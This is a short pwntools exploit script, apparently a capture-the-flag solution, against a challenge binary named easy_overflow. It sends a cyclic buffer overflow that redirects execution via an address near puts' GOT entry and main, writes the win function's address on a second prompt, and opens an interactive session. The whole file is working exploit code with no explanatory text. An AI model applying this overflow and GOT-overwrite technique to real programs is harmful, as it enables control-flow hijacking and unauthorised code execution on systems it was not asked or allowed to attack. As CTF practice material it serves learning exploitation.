from pwn import *

# Allows you to switch between local/GDB/remote from terminal
def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)

# Specify your GDB script here for debugging
gdbscript = '''
break *vuln
continue
'''.format(**locals())

exe = './challenge/easy_overflow'
elf = context.binary = ELF(exe, checksec=False)
p = start()

p.sendline(flat(
    cyclic(32),
    elf.got.puts + 0x20,
    elf.sym.main + 70
))

p.sendlineafter(b'I will give you one more chance.', p64(elf.sym.win))
p.interactive()
